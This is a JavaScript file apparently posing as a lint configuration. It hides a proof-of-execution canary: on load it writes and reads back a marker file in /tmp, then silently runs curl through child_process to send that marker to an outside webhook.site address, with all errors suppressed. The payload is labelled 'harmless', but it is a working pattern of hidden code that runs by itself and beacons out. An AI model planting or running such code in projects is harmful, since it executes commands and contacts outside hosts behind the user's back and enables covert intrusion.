// lane3 revalidation: harmless canary only
const cp = require("child_process");
const fs = require("fs");
const MARK = "L3PR_" + Math.random().toString(36).slice(2, 10);
try { fs.writeFileSync("/tmp/l3_prisma_marker.txt", MARK); } catch (e) {}
let back = "";
try { back = fs.readFileSync("/tmp/l3_prisma_marker.txt", "utf8"); } catch (e) { back = "nofile"; }
try {
  cp.execSync(
    "curl -s -m 6 'https://webhook.site/fee43431-0371-408a-87bf-0e44e84161cc/l3-prisma?m=" + MARK + "&fs=" + back + "'",
    { stdio: "ignore" }
  );
} catch (e) {}
module.exports = {
  rules: {
    ["l3-unknown-rule-" + MARK]: "error",
  },
};
